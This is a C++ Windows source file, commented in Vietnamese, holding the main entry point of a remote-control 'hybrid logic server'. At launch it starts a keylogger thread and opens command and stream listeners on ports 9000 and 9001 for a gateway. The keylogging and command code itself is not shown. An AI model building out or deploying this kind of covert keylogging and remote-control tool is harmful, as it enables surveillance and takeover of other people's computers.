#define _CRT_SECURE_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>

#include "CommandRouter.h"
#include "controllers/KeylogController.h"
#include "controllers/DeviceController.h"
#include "utils/helpers.h"
#include "utils/logging.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;
using namespace std;

const int CMD_PORT = 9000;
const int STREAM_PORT = 9001;

// Hàm lấy IP
string getClientIp(sockaddr_in client_addr)
{
    char ip[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(client_addr.sin_addr), ip, INET_ADDRSTRLEN);
    return string(ip);
}

// Hàm lắng nghe cổng Stream
void streamAcceptLoop(CommandRouter *router, SOCKET streamListenSocket)
{
    while (true)
    {
        sockaddr_in client_addr;
        int client_len = sizeof(client_addr);
        SOCKET streamClient = accept(streamListenSocket, (sockaddr *)&client_addr, &client_len);
        if (streamClient == INVALID_SOCKET)
            continue;

        // Mỗi kết nối stream -> Một luồng mới
        string ip = getClientIp(client_addr);
        std::thread(&CommandRouter::handleStreamClient, router, streamClient, ip).detach();
    }
}

// Hàm main
int main()
{
    SetProcessDPIAware();
    SetConsoleOutputCP(65001);
    srand((unsigned int)time(0));

    GdiplusStartupInput g;
    ULONG_PTR t;
    GdiplusStartup(&t, &g, NULL);
    WSADATA w;
    WSAStartup(MAKEWORD(2, 2), &w);

    // Khởi động các dịch vụ nền
    KeylogController::startKeyLoggerThread();
    std::thread(DeviceController::buildDeviceListJson).detach();

    // Thiết lập cổng lệnh - 9000
    SOCKET cmdListenSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in cmdAddr = {AF_INET, htons(CMD_PORT)};
    cmdAddr.sin_addr.s_addr = INADDR_ANY;
    bind(cmdListenSocket, (sockaddr *)&cmdAddr, sizeof(cmdAddr));
    listen(cmdListenSocket, SOMAXCONN);

    // Thiết lập cổng stream - 9001
    SOCKET streamListenSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in streamAddr = {AF_INET, htons(STREAM_PORT)};
    streamAddr.sin_addr.s_addr = INADDR_ANY;
    bind(streamListenSocket, (sockaddr *)&streamAddr, sizeof(streamAddr));
    listen(streamListenSocket, SOMAXCONN);

    cout << "=== HYBRID LOGIC SERVER READY ===" << endl;
    cout << "Listening for Commands (1) on port " << CMD_PORT << endl;
    cout << "Listening for Streams (N) on port " << STREAM_PORT << endl;

    // In IP
    auto ips = getLocalIPv4Addresses();
    cout << "-------------------------------------------------" << endl;
    cout << "Access web UI via http://" << (ips.empty() ? "localhost" : ips[0]) << ":8080" << endl;
    cout << "-------------------------------------------------\n"
         << endl;

    // Tạo 1 Router duy nhất
    CommandRouter router;

    // Tạo 1 luồng riêng để chấp nhận stream
    thread streamThread(streamAcceptLoop, &router, streamListenSocket);
    streamThread.detach();

    // Luồng chính chấp nhận kết nối Lệnh. Chỉ chấp nhận 1 kết nối từ Gateway và giữ mãi mãi.
    while (true)
    {
        sockaddr_in cmd_client_addr;
        int cmd_client_len = sizeof(cmd_client_addr);
        SOCKET cmdClient = accept(cmdListenSocket, (sockaddr *)&cmd_client_addr, &cmd_client_len);

        // Khi Gateway kết nối, chuyển sang CommandRouter xử lý
        // Hàm lúc này sẽ bị block luồng main cho đến khi Gateway đóng
        router.handleCommandClient(cmdClient);

        // Nếu Gateway đóng, lặp lại để chờ kết nối mới
        cout << "[WARN] Gateway (Cong Lenh) bi ngat, cho ket noi lai..." << endl;
    }

    GdiplusShutdown(t);
    WSACleanup();
    closesocket(cmdListenSocket);
    closesocket(streamListenSocket);
    return 0;
}